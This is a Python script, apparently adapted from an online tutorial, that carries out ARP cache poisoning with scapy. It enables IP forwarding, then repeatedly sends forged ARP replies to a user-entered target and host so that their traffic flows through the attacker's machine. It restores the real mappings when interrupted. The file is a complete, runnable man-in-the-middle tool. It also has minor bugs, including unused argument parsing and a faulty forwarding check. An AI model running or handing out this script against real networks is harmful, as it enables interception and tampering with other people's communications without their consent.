from ipaddress import ip_address
from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys
#https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
def enable_linux_iproute():
    #Enables IP route ( IP Forward ) in linux-based distro
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)

def enable_ip_route(verbose=True):
    #Enables IP forwarding..
    if verbose:
            print("Enabling IP Routing!...")
            enable_linux_iproute()
    if verbose:
            print("IP Routing Enabled!")

def get_mac_address(ip):
    #Returns MAC address of ANY device connected to the network
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=3,verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip,host_ip, verbose=True):
    target_mac_address = get_mac_address(target_ip)
    #now to craft the response
    #We'll need the 'is-at' op code in the packet (response)
    #we don't care about hwsrc (hardware source MAC address)
    #By default the hwsrc (hardware source) is the address of the sender (us)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac_address,psrc=host_ip,op='is-at')
    #Now to send the packet
    send(arp_response,verbose=1)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+++]\nSent to {} : {} is-at {}  \n[+++]".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    #Restores the normal process of a regular network
    #This is done by sending back the original information(s)
    #Real IP & MAC of host_ip to target_ip

    #Get the real MAC of the target
    target_mac = get_mac_address(target_ip)
    #Get the real MAC address of spoofed (gateway)
    host_mac = get_mac_address(host_ip)
    #crafting the restoring packet
    arp_response = ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,hwsrc=host_mac,op="is-at")

    #Now to send the packet to restore the network
    send(arp_response,verbose=1,count=6)#sent 6 times just for good measure
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if len(sys.argv) == 2:
    if(sys.argv) == '-h':
        print('help Menu...')
if len(sys.argv) == 3:
    try:
        spoof_target = ip_address(sys.argv[1])
        spoof_host = ip_address(sys.argv[2])
    except:
        print('Value Error')
        exit()


if __name__ == "__main__":
    enable_ip_route()
    verbose=1
    # target = '10.5.26.23'
    # host = '10.5.117.179'
    target = input("Enter target IP address: ")
    host = input("Enter host IP address: ")
    try:
        while True:
            #telling the target we are now the host
            spoof(target,host,verbose)
            #telling the host that we are the target
            spoof(host,target,verbose)
            #sleep
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
